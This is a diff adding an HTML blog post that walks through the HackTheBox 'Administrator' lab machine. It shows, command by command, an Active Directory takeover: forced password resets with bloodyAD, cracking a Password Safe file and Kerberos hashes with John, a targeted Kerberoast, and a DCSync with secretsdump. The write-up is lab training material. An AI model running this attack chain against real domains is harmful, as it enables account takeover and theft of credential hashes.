@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB: Administrator Walkthrough — andrew@kali:~$</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap');
+
+  :root {
+    --bg: #060b12;
+    --bg-raised: #0a1420;
+    --border: #123049;
+    --border-strong: #1c4463;
+    --cyan: #38bdf8;
+    --cyan-bright: #7dd3fc;
+    --text: #cfe3f2;
+    --text-dim: #5f7d95;
+    --text-faint: #3a5268;
+  }
+
+  * { box-sizing: border-box; }
+
+  html, body {
+    margin: 0;
+    padding: 0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'JetBrains Mono', 'Courier New', monospace;
+    font-size: 14px;
+    line-height: 1.7;
+  }
+
+  a { color: var(--cyan); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  a:focus-visible { outline: 2px solid var(--cyan-bright); outline-offset: 2px; }
+
+  .wrap { max-width: 720px; margin: 0 auto; padding: 0 20px 60px; }
+
+  nav {
+    border-bottom: 1px solid var(--border);
+    padding: 18px 0;
+    position: sticky;
+    top: 0;
+    background: rgba(6, 11, 18, 0.92);
+    backdrop-filter: blur(6px);
+    margin-bottom: 8px;
+  }
+  nav .wrap { padding-bottom: 0; }
+  nav a { color: var(--text-dim); }
+  nav a:hover { color: var(--cyan-bright); }
+
+  .post-header { padding: 40px 0 20px; border-bottom: 1px solid var(--border); margin-bottom: 32px; }
+  .tags { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 14px; }
+  .tags span {
+    border: 1px solid var(--border-strong);
+    color: var(--cyan);
+    padding: 3px 10px;
+    border-radius: 3px;
+    font-size: 11px;
+  }
+  h1 { color: var(--cyan-bright); font-size: 24px; font-weight: 700; margin: 0 0 10px; line-height: 1.35; }
+  .meta { color: var(--text-faint); font-size: 12px; }
+
+  .intro {
+    background: var(--bg-raised);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 16px 20px;
+    margin-bottom: 32px;
+    color: var(--text);
+  }
+
+  h2 {
+    color: var(--cyan-bright);
+    font-size: 17px;
+    margin: 36px 0 14px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid var(--border);
+  }
+  h2::before { content: "## "; color: var(--text-faint); }
+
+  p { margin: 0 0 16px; color: var(--text); }
+
+  code {
+    background: var(--bg-raised);
+    border: 1px solid var(--border);
+    color: var(--cyan-bright);
+    padding: 2px 6px;
+    border-radius: 3px;
+    font-size: 13px;
+  }
+
+  pre {
+    background: var(--bg-raised);
+    border: 1px solid var(--border);
+    border-left: 2px solid var(--cyan);
+    border-radius: 4px;
+    padding: 14px 16px;
+    overflow-x: auto;
+    margin: 0 0 16px;
+  }
+  pre code {
+    background: none;
+    border: none;
+    padding: 0;
+    color: var(--text);
+    font-size: 13px;
+  }
+
+  .cmd-breakdown {
+    background: var(--bg-raised);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 14px 18px;
+    margin: 0 0 16px;
+    font-size: 13px;
+  }
+  .cmd-breakdown ul { margin: 0; padding-left: 18px; }
+  .cmd-breakdown li { margin-bottom: 6px; color: var(--text-dim); }
+  .cmd-breakdown li code { margin-right: 4px; }
+
+  .result {
+    color: #4ade80;
+    font-weight: 700;
+  }
+
+  .img-note {
+    color: var(--text-faint);
+    font-size: 12px;
+    font-style: italic;
+    border: 1px dashed var(--border);
+    border-radius: 4px;
+    padding: 10px 14px;
+    margin: 0 0 16px;
+  }
+
+  figure.shot {
+    margin: 0 0 16px;
+    background: var(--bg-raised);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    overflow: hidden;
+  }
+  figure.shot img { width: 100%; display: block; }
+  figure.shot figcaption {
+    padding: 6px 12px;
+    font-size: 11px;
+    color: var(--text-faint);
+    border-top: 1px solid var(--border);
+  }
+
+  .post-footer {
+    margin-top: 48px;
+    padding-top: 20px;
+    border-top: 1px solid var(--border);
+    color: var(--text-faint);
+    font-size: 12px;
+  }
+
+  ::selection { background: rgba(56, 189, 248, 0.3); }
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="wrap"><a href="../index.html#writeups">&larr; back to writeups</a></div>
+</nav>
+
+<div class="wrap">
+
+  <header class="post-header">
+    <div class="tags">
+      <span>hackthebox</span>
+      <span>active directory</span>
+      <span>cpts</span>
+      <span>oscp</span>
+    </div>
+    <h1>HTB: Administrator Walkthrough</h1>
+    <div class="meta">andrew@kali:~$ · Nov 12, 2025 · 8 min read</div>
+  </header>
+
+  <div class="intro">
+    <p style="margin:0;">Administrator is a medium-rated box that's purely Active Directory. You start with domain credentials, and using BloodHound I found the user I have has GenericAll rights over a user that resets another user's password. That user has access to an FTP share leading to another user's credentials. That user has GenericWrite over another user, letting me run a targeted Kerberoasting attack — and finally, a DCSync attack.</p>
+  </div>
+
+  <h2>Recon</h2>
+  <figure class="shot"><img src="images/02-nmap-scan.png" alt="nmap scan results showing Kerberos, LDAP, SMB, and FTP open"></figure>
+  <pre><code>sudo nmap -sVC -p- -v -T5 &lt;ip&gt;</code></pre>
+  <p>This box looks like a domain controller — Kerberos, LDAP, SMB all showing up. FTP being open isn't standard, and WinRM is open too. I added <code>administrator.htb</code> to my <code>/etc/hosts</code> file, then enumerated Olivia's shares (the user I already had credentials for).</p>
+  <figure class="shot"><img src="images/03-olivia-shares.png" alt="nxc smb share enumeration as Olivia"></figure>
+  <pre><code>nxc smb &lt;ip&gt; -u 'Olivia' -p 'ichliebedich' --shares</code></pre>
+  <p>Nothing interesting there, so next I spun up BloodHound.</p>
+  <figure class="shot"><img src="images/04-bloodhound-collection.png" alt="nxc ldap bloodhound data collection"></figure>
+  <pre><code>nxc ldap &lt;ip&gt; -u 'Olivia' -p 'ichliebedich' --bloodhound -c all --dns-server &lt;ip&gt;</code></pre>
+
+  <h2>Abusing privileges</h2>
+  <p>BloodHound showed Olivia had <code>GenericAll</code> rights over Michael. That meant I could reset his password directly using BloodyAD.</p>
+  <figure class="shot"><img src="images/05-olivia-genericall-michael.png" alt="BloodHound graph showing Olivia has GenericAll over Michael"></figure>
+  <figure class="shot"><img src="images/06-bloodyad-reset-michael.png" alt="BloodyAD command resetting Michael's password"></figure>
+  <pre><code>bloodyAD --dc-ip 10.129.11.241 --host Administrator.htb -u 'Olivia' -p 'ichliebedich' set password Michael Password123-</code></pre>
+  <div class="cmd-breakdown">
+    <ul>
+      <li><code>--dc-ip</code> the domain controller's IP address</li>
+      <li><code>--host</code> the target machine's hostname</li>
+      <li><code>-u</code> / <code>-p</code> the authenticating user's credentials</li>
+      <li><code>set password Michael Password123-</code> BloodyAD's module for changing a user's password, target user, and new password</li>
+    </ul>
+  </div>
+  <p>Confirmed the reset worked with netexec, then went back to BloodHound to check Michael's outbound object controls. He had <code>ForceChangePassword</code> over Benjamin, so I repeated the same attack.</p>
+  <figure class="shot"><img src="images/07-netexec-michael-confirm.png" alt="netexec confirming authentication as Michael"></figure>
+  <figure class="shot"><img src="images/08-michael-forcechangepassword-benjamin.png" alt="BloodHound graph showing Michael has ForceChangePassword over Benjamin"></figure>
+  <pre><code>bloodyAD --dc-ip 10.129.11.241 --host Administrator.htb -u 'Michael' -p 'Password123-' set password Benjamin NewPass123-</code></pre>
+  <figure class="shot"><img src="images/09-bloodyad-reset-benjamin.png" alt="BloodyAD command resetting Benjamin's password"></figure>
+  <figure class="shot"><img src="images/10-netexec-benjamin-confirm.png" alt="netexec confirming authentication as Benjamin"></figure>
+
+  <h2>Getting the user flag</h2>
+  <p>At this point BloodHound showed no further outbound object controls, so I went back to the nmap results — FTP was open, and Benjamin's new credentials got me onto it. I found a file called <code>Backup.psafe3</code>, an encrypted Password Safe database.</p>
+  <figure class="shot"><img src="images/11-ftp-backup-psafe3.png" alt="FTP session downloading Backup.psafe3"></figure>
+  <p>To open it I installed PasswordSafe:</p>
+  <pre><code>sudo apt install passwordsafe
+pwsafe Backup.psafe3</code></pre>
+  <p>It prompted for a password.</p>
+  <figure class="shot"><img src="images/12-passwordsafe-prompt.png" alt="PasswordSafe master password prompt"></figure>
+  <p>I used <code>pwsafe2john</code> (from the John the Ripper suite) to convert the hash and crack it.</p>
+  <figure class="shot"><img src="images/13-pwsafe2john.png" alt="pwsafe2john extracting the hash"></figure>
+  <pre><code>pwsafe2john Backup.psafe3 &gt; hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code></pre>
+  <figure class="shot"><img src="images/14-john-crack-psafe.png" alt="John the Ripper cracking the Password Safe hash"></figure>
+  <p>John cracked it: <span class="result">tekieromuncho</span>.</p>
+  <figure class="shot"><img src="images/15-passwordsafe-unlocked.png" alt="Password Safe unlocked with the cracked master password"></figure>
+  <p>Opening the database revealed three more sets of credentials.</p>
+  <figure class="shot"><img src="images/16-passwordsafe-users.png" alt="Password Safe entries for three users"></figure>
+  <figure class="shot"><img src="images/17-passwordsafe-copy-credentials.png" alt="Copying a password to clipboard from Password Safe"></figure>
+  <p>I copied the credentials out and tried each against evil-winrm. Emily's worked, and I got the user flag.</p>
+  <figure class="shot"><img src="images/18-evilwinrm-emily-userflag.png" alt="evil-winrm session as Emily reading user.txt"></figure>
+
+  <h2>Root flag</h2>
+  <p>Back in BloodHound, Emily had <code>GenericWrite</code> over Ethan. That's enough to set a Service Principal Name (SPN) on Ethan's account and run a targeted Kerberoast attack against him.</p>
+  <figure class="shot"><img src="images/19-emily-genericwrite-ethan.png" alt="BloodHound graph showing Emily has GenericWrite over Ethan"></figure>
+  <pre><code>git clone https://github.com/ShutdownRepo/targetedKerberoast.git
+cd targetedKerberoast
+python3 targetedKerberoast.py --dc-ip '&lt;ip&gt;' -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTjXmb'</code></pre>
+  <p>Hit a <code>KRB_AP_ERR_SKEW</code> error — a common Kerberos clock-sync issue.</p>
+  <figure class="shot"><img src="images/20-targetedkerberoast-skew-error.png" alt="KRB_AP_ERR_SKEW error from targetedKerberoast.py"></figure>
+  <p>Fixed it by syncing my clock to the target:</p>
+  <pre><code>sudo timedatectl set-ntp off
+rdate -n &lt;ip&gt;</code></pre>
+  <figure class="shot"><img src="images/21-kerberoast-ethan-hash.png" alt="targetedKerberoast.py output with Ethan's Kerberos hash"></figure>
+  <figure class="shot"><img src="images/22-cat-ethanhash.png" alt="cat of the saved Kerberoast hash file"></figure>
+  <figure class="shot"><img src="images/23-john-crack-ethan.png" alt="John the Ripper cracking Ethan's Kerberoast hash"></figure>
+  <p>Reran the attack and got Ethan's hash, then cracked it with John: <span class="result">limpbizkit</span>.</p>
+  <figure class="shot"><img src="images/24-netexec-ethan-confirm.png" alt="netexec confirming authentication as Ethan"></figure>
+  <p>Confirmed the credentials with netexec, then checked Ethan's outbound object controls in BloodHound — he had <code>GetChangesInFilteredSet</code>, <code>GetChanges</code>, and <code>GetChangesAll</code>. Together, those three permissions mean Ethan can replicate data from the domain controller as if he were another DC — enough for a DCSync attack.</p>
+  <figure class="shot"><img src="images/25-bloodhound-dcsync-rights.png" alt="BloodHound graph showing Ethan's DCSync-enabling rights over the domain"></figure>
+  <pre><code>secretsdump.py -just-dc -outputfile administrator_hashes administrator.htb/ethan:limpbizkit@10.129.10.120</code></pre>
+  <figure class="shot"><img src="images/26-secretsdump-output.png" alt="secretsdump DCSync output with dumped domain hashes"></figure>
+  <p>That pulled the Administrator's hash. From there it was straight into evil-winrm with the hash, and root.</p>
+  <figure class="shot"><img src="images/27-evilwinrm-root-flag.png" alt="evil-winrm session as Administrator reading root.txt"></figure>
+
+  <figure class="shot"><img src="images/01-pwned-banner.png" alt="HackTheBox Administrator has been pwned banner"></figure>
+
+  <div class="post-footer">
+    andrew@kali:~$ <a href="../index.html#writeups">cd ~/writeups</a>
+  </div>
+
+</div>
+
+</body>
+</html>
